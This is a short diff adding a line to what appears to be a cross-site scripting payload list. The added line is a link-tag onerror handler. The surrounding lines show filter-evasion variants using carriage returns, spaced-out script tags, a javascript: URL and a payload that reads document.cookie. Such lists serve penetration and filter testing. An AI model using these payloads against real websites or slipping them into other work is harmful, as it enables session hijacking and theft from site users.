@@ -306,6 +306,8 @@ Carriage Return <script>//>%0Dalert(1);</script>
 
 Spaces < s c r i p t > p r o m t ( 1 ) < / s c r i p t >
 
+<link rel='stylesheet' href='/a' onerror='alert()'>
+
 /#text= NAME'); alert(document.cookie+'
 
 reflected XSS - /?report=javascript
